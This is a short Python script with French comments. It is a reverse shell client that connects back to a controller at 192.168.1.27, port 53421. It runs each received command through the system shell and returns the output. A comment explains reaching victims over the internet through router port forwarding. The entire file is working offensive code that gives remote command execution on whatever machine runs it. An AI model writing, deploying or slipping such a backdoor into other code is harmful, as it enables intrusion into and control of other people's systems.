#!/usr/bin/python

import socket
import subprocess
import json

iptoconnect = "192.168.1.27" #si on fait une attaque a travers internet avec port forward, il faut l'ip publique du routeur, et le port forward du routeur
porttoconnect = 53421


def reliable_send(data): #pour envoyer plus de 1024 bits
	json_data = json.dumps(data)
	sock.send(json_data)

def reliable_recv():
	data = "" #empty
	while True:
		try:
			data = data + sock.recv(1024)
			return json.loads(data) #une fois que c bon y a tout dans data
		except ValueError:
			continue #si on recoit plus de 1024 on continue



def shell():
	while True:
		command = reliable_recv() #value max
		if command == 'q':
			break
		else:
			proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = proc.stdout.read() + proc.stderr.read()
			reliable_send(result.encode('utf-8'))


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((iptoconnect,porttoconnect))

shell()

sock.close()
